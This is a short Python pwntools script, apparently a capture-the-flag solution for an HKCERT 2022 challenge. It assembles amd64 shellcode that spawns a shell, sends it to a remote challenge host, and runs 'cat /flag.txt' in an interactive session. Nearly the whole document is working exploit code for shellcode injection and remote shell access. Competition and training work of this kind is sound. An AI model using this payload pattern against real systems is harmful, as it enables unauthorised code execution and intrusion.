from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = '''
add %al, %al;
'''
# the code is both USELESS and USEFULL

shellcode += shellcraft.sh()
payload = asm(shellcode)

r = remote('chal.hkcert22.pwnable.hk', '28130')

r.sendafter('(max: 100): ', payload)
r.sendline(b'cat /flag.txt')
r.interactive()
